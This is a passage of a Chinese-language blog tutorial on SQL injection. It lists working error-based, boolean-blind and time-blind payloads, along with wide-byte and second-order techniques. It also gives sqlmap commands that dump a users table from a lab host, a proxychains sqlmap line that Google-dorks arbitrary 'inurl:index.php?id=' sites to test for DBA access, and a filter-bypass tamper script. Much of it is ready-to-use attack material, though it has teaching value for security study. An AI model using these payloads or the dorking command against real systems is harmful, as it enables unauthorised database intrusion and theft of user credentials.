+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&quot; .$id. &quot; LIMIT 0,1&quot;;   // 无闭合，直接拼接</span><br></pre></td></tr></table></figure>
+
+<p>高级：直接使用16进制注入sql里面去进行执行</p>
+<p><strong>字符型</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;&quot; .$id. &quot;&#x27; LIMIT 0,1&quot;;   // &#x27; 单引号</span><br><span class="line">$sql=&#x27;SELECT * FROM users WHERE id=&quot;&#x27; .$id. &#x27;&quot; LIMIT 0,1&#x27;;   // &quot; 双引号</span><br></pre></td></tr></table></figure>
+
+<p><strong>搜索型</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?name=曾</span><br><span class="line">$name=$_GET[&#x27;name&#x27;];</span><br><span class="line">$sql=&quot;select * from users where username like &#x27;%&quot; .$name.&quot;%&#x27; LIMIT 0,1&quot;;   // 无闭合，直接拼接</span><br><span class="line">注入方式一:</span><br><span class="line">select * from 表名 where 字段 like &#x27;%测试%&#x27; and &#x27;%1%&#x27;=&#x27;%1%&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>特殊闭合型</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&quot; .$id. &quot; LIMIT 0,1&quot;;         #     直接拼接</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;&quot; .$id. &quot;&#x27; LIMIT 0,1&quot;;       # &#x27;   单引号</span><br><span class="line">$sql=&#x27;SELECT * FROM users WHERE id=&quot;&#x27; .$id. &#x27;&quot; LIMIT 0,1&#x27;;       # &quot;   双引号</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&quot; .$id. &quot;) LIMIT 0,1&quot;;       # )   括号</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&quot; .$id. &quot;)) LIMIT 0,1&quot;;     # ))  括号+括号</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;&quot; .$id. &quot;&#x27;) LIMIT 0,1&quot;;     # &#x27;)  单引号+括号</span><br><span class="line">$sql=&#x27;SELECT * FROM users WHERE id=(&quot;&#x27; .$id. &#x27;&quot;) LIMIT 0,1&#x27;;     # &quot;)  双引号+括号</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&#x27;&quot; .$id. &quot;&#x27;)) LIMIT 0,1&quot;;   # &#x27;)) 单引号+括号+括号</span><br><span class="line">$sql=&#x27;SELECT * FROM users WHERE id=((&quot;&#x27; .$id. &#x27;&quot;)) LIMIT 0,1&#x27;;   # &quot;)) 双引号+括号+括号</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、报错注入"><a href="#2、报错注入" class="headerlink" title="2、报错注入"></a>2、报错注入</h4><blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/c1047509362/p/12806297.html">SQL注入实战之报错注入篇（updatexml extractvalue floor）</a></p>
+</blockquote>
+<p>在页面有可控的输入，但是页面没有信息展示，即使注入了sql命令，也没有任何信息显示，可以利用<strong>报错信息</strong>将数据输出；</p>
+<p>在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数：<code>updatexml()</code>、<code>extractvalue()</code> 。当这两个函数在执行时，如果出现xml文档路径错误就会产生报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x24 : 36  : 00100100 : $</span><br><span class="line">0x3F : 63  : 00111111 : ?</span><br><span class="line">0x7E : 126 : 01111110 : ~</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：在MySQL 8.0版本中，EXTRACTVALUE()函数已被弃用，并且不推荐使用。替代方案是使用更现代的XML函数和操作符，如XMLQuery、XPATH等。</p>
+</blockquote>
+<blockquote>
+<p>有长度限制，就在后面加上 <code>LIMIT 0,1</code></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"># 有长度限制，最多64位</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>floor (rand(0)*2)</code> 函数</p>
+<p>floor函数的作用就是返回小于等于括号内该值的最大整数。</p>
+<p>rand()本身是返回0<del>1的随机数，但在后面*2就变成了返回0</del>2之间的随机数。</p>
+<p>配合上floor函数就可以产生确定的两个数，即0和1。</p>
+<p>并且结合<strong>固定的随机数种子0</strong>，它每次产生的随机数列都是相同的值。（0110110011）</p>
+<p>group by key 执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的 key 时，如果 key 存在于临时表中，则更新临时表中的数据（更新数据时，不再计算 rand 值）；如果该 key 不存在于临时表中，则在临时表中插入 key 所在行的数据。（插入数据时，会再计算rand 值）</p>
+<p>如果此时临时表只有 key 为 1 的行不存在 key 为 0 的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为 1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值</p>
+<p>实际测试中发现，出现报错，至少要求数据记录为 3 行，记录数超过 3 行一定会报错，2 行时是不报错的。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"># 有长度限制，最多32位</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li>此函数从目标XML中返回包含所查询值的字符串 语法：<code>extractvalue(XML_document，xpath_string)</code> 第一个参数：string格式，为XML文档对象的名称；第二个参数：<code>xpath_string</code>（xpath格式的字符串）。 <code>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</code></li>
+<li><code>extractvalue</code>使用时当<code>xpath_strin</code>g格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
+<li><code>select user,password from users where user_id=1 and (extractvalue(1,0x7e));</code></li>
+<li>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3.updatexml()</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"># 有长度限制，最多32位</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><p><code>updatexml()</code> 是一个使用不同的xml标记匹配和替换xml块的函数。</p>
+</li>
+<li><p>作用：改变文档中符合条件的节点的值</p>
+</li>
+<li><p>语法： <code>updatexml(XML_document，XPath_string，new_value)</code> 第一个参数：是string格式，为XML文档对象的名称，文中为Doc；第二个参数：代表路径，Xpath格式的字符串例如&#x2F;&#x2F;title【@lang】；第三个参数：string格式，替换查找到的符合条件的数据</p>
+</li>
+<li><p><code>updatexml</code>使用时，当 <code>xpath_string</code> 格式出现错误，由于0x7e就是~不属于xpath语法格式，mysql则会爆出xpath语法错误（xpath syntax）</p>
+</li>
+<li><p>例如： <code>select * from test where ide = 1 and (updatexml(1,0x7e,3));</code> 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</p>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br><span class="line"># 用不了好像</span><br></pre></td></tr></table></figure>
+
+<h4 id="3、布尔盲注"><a href="#3、布尔盲注" class="headerlink" title="3、布尔盲注"></a>3、布尔盲注</h4><blockquote>
+<p>点击 <a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/ascii.htm">ASCII表</a> 进行查看。</p>
+</blockquote>
+<p>Boolean是基于真假的判断（true or false），Boolean盲注适用场景是不管输入什么，结果都只返回真或假两种情况。</p>
+<p>Boolean型盲注的关键在于通过表达式结果与已知值进行比对，根据比对结果判断正确与否。</p>
+<p>盲注有时需要一个一个字符去猜，因此一些字符串操作的函数经常被用到。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 盲注常用到的sql函数</span><br><span class="line">length()        # 返回查询字符串的长度</span><br><span class="line">substr(a, b, c) # 截取字符串，从b位置开始(从1开始)，截取字符串a的c长度</span><br><span class="line">mid(a, b, c)    # 截取字符串，从b位置开始(从1开始)，截取字符串a的c位</span><br><span class="line">left(a,b)       # 截取字符串，从左侧截取a的前b位</span><br><span class="line">ascii()         # 返回字符的ASCII码</span><br><span class="line">ord()           # 返回字符的ASCII码</span><br></pre></td></tr></table></figure>
+
+<p>举例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(ascii(substr(database(),1,1))=115)</span><br><span class="line"></span><br><span class="line"># 判断当前使用的数据库名是不是7个字符</span><br><span class="line">?id=1&#x27; and length(database())=7 -- -</span><br><span class="line"></span><br><span class="line">#  判断数据库名字符串的边界，如果超出字符串，ascii码就是0x00、0、NUL 空</span><br><span class="line">?id=1&#x27; and ascii(substr(database(),8,1))=0 -- -</span><br><span class="line"></span><br><span class="line">#  判断所有数据库名拼接成的字符串的第一个字符是不是i，ascii码就是0x69、105、i</span><br><span class="line">?id=1&#x27; and ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1)=105 -- -</span><br><span class="line"></span><br><span class="line">#  判断当前数据库所有表名拼接成的字符串的第一个字符是不是i，ascii码就是0x69、105、i</span><br><span class="line">?id=1&#x27; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=105 -- -</span><br><span class="line"></span><br><span class="line">#  判断security数据库的users表的所有列名拼接成的字符串的第一个字符是不是i，ascii码就是0x69、105、i</span><br><span class="line">?id=1&#x27; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)),1,1))=105 -- -</span><br><span class="line"></span><br><span class="line">#  判断security数据库的users表的第1条数据拼接成的字符串的第一个字符是不是1，ascii码就是0x31、49、1</span><br><span class="line">?id=1&#x27; ascii(substr((select concat(id,0x7e,username,0x24,password) from security.users limit 0,1),1,1))=49 -- -</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意 <code>length()</code> 里面不能是 <code>group_concat()</code> 的结果，因为 length 函数用于获取字符串的长度，而不是用于计算子查询的结果集的长度。</p>
+</blockquote>
+<p>循环测试有点低效，可以用二分法。</p>
+<h4 id="4、时间盲注"><a href="#4、时间盲注" class="headerlink" title="4、时间盲注"></a>4、时间盲注</h4><blockquote>
+<p><code> sleep(3)</code> 如果转圈圈转到超时，那就改成0.5或者更小</p>
+</blockquote>
+<p>时间盲注又称延迟注入，适用于页面不会返回错误信息，只会回显一种界面。</p>
+<p>其主要特征是利用sleep函数让mysql执行时间变长，制造时间延迟，通过页面的响应时间来判断条件是否正确。通常与 <code>if(expr1,expr2,expr3)</code> 语句结合使用（如果expr1是True，则返回expr2，否则返回expr3）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 判断闭合符号：由于页面无法返回正确或错误的值，所以只能通过if加sleep函来判断闭合</span><br><span class="line"></span><br><span class="line"># 判断闭合方式，如果是，页面会延迟响应4秒</span><br><span class="line">?id=1&#x27; and if(1=2, 1, sleep(4))--+</span><br><span class="line">?id=1&quot; and if(1=2, 1, sleep(4))--+</span><br><span class="line">?id=1&#x27;) and if(1=2, 1, sleep(4))--+</span><br><span class="line">?id=1&quot;) and if(1=2, 1, sleep(4))--+</span><br><span class="line">?id=1&#x27;)) and if(1=2, 1, sleep(4))--+</span><br><span class="line">?id=1&quot;)) and if(1=2, 1, sleep(4))--+</span><br><span class="line"></span><br><span class="line"># 判断闭合方式，如果是，页面会延迟响应3秒</span><br><span class="line">?id=1&#x27; and sleep(3)--+</span><br><span class="line">?id=1&quot; and sleep(3)--+</span><br><span class="line">?id=1&#x27;) and sleep(3)--+</span><br><span class="line">?id=1&quot;) and sleep(3)--+</span><br><span class="line">?id=1&#x27;)) and sleep(3)--+</span><br><span class="line">?id=1&quot;)) and sleep(3)--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1&#x27; and if((ascii(substr(database(),1,1))=7),1,sleep(5)) -- -    # 通过响应时间来注出数据库名</span><br><span class="line">?sort=1&#x27; and if((ascii(substr(database(),1,1))=115),sleep(0.5),1) -- -</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>sleep(5)</code> 函数是用于在SQL语句中设置一个延迟操作，其中的参数5表示延迟的秒数，即在执行该语句时会暂停5秒钟。</p>
+<p><code>BENCHMARK(5000000, SHA1(&#39;Hello World&#39;))</code> 函数是用于在SQL语句中执行一个计算密集型的操作，其中的参数5000000表示重复执行SHA1(‘Hello World’)这个操作5000000次，用于模拟一个计算密集型的任务。</p>
+</blockquote>
+<h4 id="5、堆叠注入（少见）"><a href="#5、堆叠注入（少见）" class="headerlink" title="5、堆叠注入（少见）"></a>5、堆叠注入（少见）</h4><p>堆叠注入原理</p>
+<p>Stacked injection 汉语翻译过来后，称为堆查询注入，也称之为堆叠注入，顾名思义，就是将语句堆叠在一起进行查询。在PHP中，<code>mysql_multi_query()</code>支持多条sql语句同时执行，分号<code>;</code>是用来表示一条sql语句的结束。当我们在;结束一个sql语句后继续构造下一条语句，使其执行，就构成了堆叠注入。</p>
+<p>比如：插入数据、读取文件、写入文件</p>
+<p>堆叠注入的触发条件很苛刻，在实际中遇到的很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句并且目标未对;号进行过滤时才能够使用，在PHP中利用<code>mysqli_multi_query()</code>函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是<code>mysqli_ query()</code>函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限。</p>
+<h4 id="6、宽字节注入"><a href="#6、宽字节注入" class="headerlink" title="6、宽字节注入"></a>6、宽字节注入</h4><blockquote>
+<p>无论是发送<strong>GET请求</strong>还是<strong>POST请求</strong>，如果包含汉字或其他非ASCII字符，这些字符会先被转换为<strong>UTF-8编码</strong>，然后再进行<strong>URL编码</strong>。</p>
+</blockquote>
+<blockquote>
+<p><strong>URL编码格式</strong>是一种将数据转换为特定格式以便在URL中传输的方法。在URL编码中，特殊字符和非ASCII字符会被转换为<code>%xx</code>的形式，其中<code>xx</code>是字符的ASCII码的十六进制表示。</p>
+</blockquote>
+<blockquote>
+<p>通常情况下，当请求头<strong>Content-Type</strong>为<strong>application&#x2F;x-www-form-urlencoded</strong>时，数据会以<strong>UTF-8</strong>进行编码，然后转为URL编码格式。但是如果HTML的<strong>charset</strong>设置的是<strong>GBK</strong>，发送POST请求，数据会以<strong>GBK</strong>进行编码然后转为URL编码格式。</p>
+</blockquote>
+<p>为了防止网站被SQL注入，一些网站开发人员会做一些防护措施，其中最常见的就是对一些特殊字符进行转义，在PHP中，使用<code>magic_quotes_gpc(魔术引号)</code>或者 <code>addslashes()</code>函数，对用户提交的数据，如有：post、get、cookie过来的数据增加转义符 <code>\</code> 以确保这些数据不会引起程序错误。当我们输入的引号被转义之后只当作了一个字符串，无法实现包裹字符串的作用了。如何让转义\失去转义的作用，此时，就可以使用宽字节注入。宽字节编码就是一个字符可能是好几个字节。</p>
+<p><code>\</code>转义通过URL编码是<code>%5c</code>。那么找到一个与 %5c 的另一半，让他们组成一个新字符不就OK了吗？哪个字节编码能让他们组成一个新字符呢？很多，eg：%df …，%df%5c。这两个在一块就组成了一个新的字符，准确的说是一个汉字，那么我们输入的引号的特殊意义就存在，可以是包裹字符串的了。</p>
+<blockquote>
+<p>如果在发送GET请求时，请求参数中包含%df的形式，这个%df不会被再次URL编码。它会被直接发送到服务器，而不会被UTF-8编码。</p>
+<p>当发送POST请求时，请求参数中包含%df的形式时，这个%df会被UTF-8编码。在POST请求中，请求参数会被编码成UTF-8格式，并且特殊字符会被转换成相应的编码形式，包括%df。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii: 0x5c   \</span><br><span class="line">ascii: 0x27   &#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/18/SQL%E6%B3%A8%E5%85%A5/oCam_2023_12_22_16_28_53_124.png"></p>
+<h4 id="其它：二次注入"><a href="#其它：二次注入" class="headerlink" title="其它：二次注入"></a>其它：二次注入</h4><p>二次注入的原理</p>
+<p>二次注入一般无法通过扫描工具、手工注入或黑盒测试去进行，一般是用于白盒测试，原因是漏洞本身产生的原理。二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 语句中导致的注入。二次注入比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p>
+<p>二次注入可分为两步：</p>
+<p>1、插入恶意数据：进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p>
+<p>2、引用恶意数据：开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验处理。</p>
+<p>比如：如果本来就存在用户名<code>xxx</code>，然后把我们的用户名设置为<code>xxx&#39;#</code>，且后台记录用户名是放在<strong>session</strong>里，更新数据时，是根据<strong>session</strong>里的用户名进行筛选，并且不对<strong>session</strong>的数据进行转义，并且在条件<strong>where</strong>中是第一个，就可以进行二次注入</p>
+<p><img src="/2023/12/18/SQL%E6%B3%A8%E5%85%A5/oCam_2023_12_22_16_38_53_124.png"></p>
+<h4 id="其它：DNSlog带外注入"><a href="#其它：DNSlog带外注入" class="headerlink" title="其它：DNSlog带外注入"></a>其它：DNSlog带外注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_45954730/article/details/131525362</span><br><span class="line">http://dnslog.cn/</span><br></pre></td></tr></table></figure>
+
+<h4 id="其它：参数污染"><a href="#其它：参数污染" class="headerlink" title="其它：参数污染"></a>其它：参数污染</h4><blockquote>
+<p>正常连接 <a target="_blank" rel="noopener" href="https://www.985.so/">转为</a> <a target="_blank" rel="noopener" href="https://reurl.cc/main/cn">短链接</a>，IP地址 <a target="_blank" rel="noopener" href="http://www.jsons.cn/ipnum/">转为</a> 数字链接</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?p=utf&amp;p=gbk</span><br><span class="line">百度1</span><br><span class="line">雅虎2</span><br><span class="line">Google 1+2</span><br><span class="line">php/apache 2</span><br><span class="line">flask 1</span><br><span class="line">jsp/tomcat 1</span><br><span class="line">CGI/apache 1</span><br><span class="line">python/apache 1+2</span><br><span class="line">asp/iis</span><br><span class="line">?p=utf?p=utf?p=utf?p=utf?p=utf?p=utf?p=utf?p=utf?p=utf?p=utf?p=utf?p=utf?p=utf?p=utf?p=utf?p=utf&amp;p=gbk</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="注入提交方式"><a href="#注入提交方式" class="headerlink" title="注入提交方式"></a>注入提交方式</h3><p>常见的注入提交有：GET提交、POST提交、COOKIE提交</p>
+<p>Get注入：提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接 <a target="_blank" rel="noopener" href="http://xxx.com/news.php?id=1">http://xxx.com/news.php?id=1</a> ，id 是注入点。</p>
+<p>Post注入：使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>
+<p>Cookie注入：HTTP 请求的时候会带上客户端的 Cookie， 注入点存在 Cookie 当中的某个字段中。</p>
+<p>Http头部注入：注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
+<h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/t102526/article/details/129357031">sqlmap工具说明-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/131236510">SQLmap使用教程图文教程（超详细）-CSDN博客</a></p>
+<h3 id="SQLmap是什么"><a href="#SQLmap是什么" class="headerlink" title="SQLmap是什么"></a>SQLmap是什么</h3><p>SQLMAP是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL和SQL注入漏洞，其广泛的功能和选项包括数据库指纹，枚举，数据库提权，访问目标文件系统，并在获取操作权限时执行任意命令。</p>
+<p>SQLMAP是开源的自动化SQL注入工具，由Python写成。</p>
+<p>支持windows、linux等</p>
+<p>技术：布尔盲注、时间盲注、报错注入、联合查询注入、堆查询注入</p>
+<h3 id="SQLmap安装"><a href="#SQLmap安装" class="headerlink" title="SQLmap安装"></a>SQLmap安装</h3><p>windows系统：需要先下载python安装，然后再下载sqlmap进行安装和使用。Sqlmap项目存储在github上。使用sqlmap之前必须安装python，并添加环境变量，如： <code>E:\python\python37</code> 。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./sqlmap.my -u &quot;http://192.168.2.39/sqli/Less-1/?id=1&quot; --batch --dbs</span><br></pre></td></tr></table></figure>
+
+<p>kali系统：自带sqlmap工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.39/sqli/Less-1/?id=1&quot; --batch --dbs</span><br><span class="line">python3 sqlmap [options]</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQLMAP常用⭐"><a href="#SQLMAP常用⭐" class="headerlink" title="SQLMAP常用⭐"></a>SQLMAP常用⭐</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.77/sqli/Less-1/?id=1&quot; --dbs    #枚举数据库</span><br><span class="line">sqlmap -u &quot;http://192.168.2.77/sqli/Less-1/?id=1&quot; --dbs --batch    # 使用默认行为</span><br><span class="line">sqlmap -u &quot;http://192.168.2.77/sqli/Less-1/?id=1&quot; --dbs -D security --tables</span><br><span class="line">sqlmap -u &quot;http://192.168.2.77/sqli/Less-1/?id=1&quot; --dbs -D &quot;security&quot; -T users --columns</span><br><span class="line">sqlmap -u &quot;http://192.168.2.77/sqli/Less-1/?id=1&quot; --dbs -D security -T &quot;users&quot; -C &quot;id,password&quot; --dump</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST请求 Yakit抓包</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/etc/proxychains4.conf</span><br><span class="line">socks4 127.0.0.1 9050    -&gt;    socks5 192.168.10.129 7890</span><br><span class="line"></span><br><span class="line">proxychains4 sqlmap -g &quot;inurl:index.php?id=&quot; --is-dba --batch</span><br></pre></td></tr></table></figure>
+
+<p><strong>模板</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.10.129/sqli/Less-26a/?id=1&quot; -v 3 --tamper=2  --dbs</span><br><span class="line">// -v 3 : 设置详细级别为3，显示详细的输出信息</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;2.py</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload= payload.lower()</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27;or&#x27;</span> , <span class="string">&#x27;oorr&#x27;</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27;and&#x27;</span> , <span class="string">&#x27;anandd&#x27;</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27; &#x27;</span> , <span class="string">&#x27;%0B&#x27;</span>)</span><br><span class="line">    retVal=payload</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
+
